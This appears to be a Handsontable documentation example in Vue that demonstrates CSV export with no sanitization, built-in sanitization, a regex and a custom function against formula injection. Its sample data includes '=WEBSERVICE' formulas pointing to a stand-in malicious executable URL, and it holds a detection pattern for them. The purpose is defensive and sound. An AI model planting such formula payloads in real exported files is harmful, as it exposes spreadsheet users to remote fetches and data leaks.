<script setup lang="ts">
import { ref } from 'vue';
import { HotTable } from '@handsontable/vue3';
import { registerAllModules } from 'handsontable/registry';
import type { GridSettings } from 'handsontable/settings';

registerAllModules();

const hotRef = ref<InstanceType<typeof HotTable> | null>(null);

const hotSettings = ref<GridSettings>({
  data: [
    ['https://handsontable.com', '=WEBSERVICE(A1)'],
    ['https://github.com', '=WEBSERVICE(A2)'],
    ['http://example.com/malicious-script.exe', '=WEBSERVICE(A3)'],
  ],
  colHeaders: true,
  rowHeaders: true,
  height: 'auto',
  autoWrapRow: true,
  autoWrapCol: true,
  licenseKey: 'non-commercial-and-evaluation',
});

const csvExportOptions = {
  bom: false,
  columnDelimiter: ',',
  colHeaders: false,
  exportHiddenColumns: true,
  exportHiddenRows: true,
  fileExtension: 'csv',
  filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
  mimeType: 'text/csv',
  rowDelimiter: '\r\n',
} as const;

function downloadWithNoSanitization(): void {
  hotRef.value?.hotInstance?.getPlugin('exportFile')?.downloadFile('csv', { ...csvExportOptions });
}

function downloadWithRecommendedSanitization(): void {
  hotRef.value?.hotInstance?.getPlugin('exportFile')?.downloadFile('csv', {
    ...csvExportOptions,
    sanitizeValues: true,
  });
}

function downloadWithRegexpSanitization(): void {
  hotRef.value?.hotInstance?.getPlugin('exportFile')?.downloadFile('csv', {
    ...csvExportOptions,
    sanitizeValues: /WEBSERVICE/,
  });
}

function downloadWithFunctionSanitization(): void {
  hotRef.value?.hotInstance?.getPlugin('exportFile')?.downloadFile('csv', {
    ...csvExportOptions,
    sanitizeValues: (value: string) => {
      return /WEBSERVICE/.test(value) ? 'REMOVED SUSPICIOUS CELL CONTENT' : value;
    },
  });
}
</script>

<template>
  <div id="example4">
    <div class="example-controls-container">
      <div class="controls">
        <button type="button" @click="downloadWithNoSanitization">
          Download CSV with no sanitization
        </button>
        <button type="button" @click="downloadWithRecommendedSanitization">
          Download CSV with recommended sanitization
        </button>
        <button type="button" @click="downloadWithRegexpSanitization">
          Download CSV with sanitization using a regexp
        </button>
        <button type="button" @click="downloadWithFunctionSanitization">
          Download CSV with sanitization using a function
        </button>
      </div>
    </div>
    <HotTable ref="hotRef" :settings="hotSettings" />
  </div>
</template>
